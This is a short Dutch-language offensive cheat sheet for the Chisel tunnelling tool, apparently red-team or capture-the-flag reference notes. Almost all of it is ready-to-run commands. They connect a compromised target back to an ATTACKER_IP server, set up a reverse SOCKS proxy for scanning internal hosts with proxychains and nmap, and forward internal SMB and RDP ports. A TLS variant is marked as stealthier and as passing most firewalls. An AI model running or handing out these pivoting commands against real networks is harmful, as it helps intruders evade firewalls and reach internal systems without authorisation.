# Chisel - TCP/SOCKS tunnel via HTTP
# === SOCKS Proxy (meest gebruikt) ===
# Server (aanvaller):
chisel server --reverse --port 8080
# Client (target):
.\chisel.exe client ATTACKER_IP:8080 R:socks
# Proxychains config (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080
# Gebruik: proxychains nmap -sT -Pn TARGET_INTERNAL
# === Port Forward ===
# Forward specifieke poort:
.\chisel.exe client ATTACKER_IP:8080 R:8888:172.16.0.10:80
# Meerdere forwards:
.\chisel.exe client ATTACKER_IP:8080 R:445:172.16.0.10:445 R:3389:172.16.0.10:3389
# === Via HTTPS (meer stealthy) ===
chisel server --reverse --port 443 --tls-key key.pem --tls-cert cert.pem
.\chisel.exe client https://ATTACKER_IP:443 R:socks
# Tip: Chisel tunnelt over HTTP/websockets - gaat door de meeste firewalls
# Tip: Gebruik --auth user:pass voor authenticatie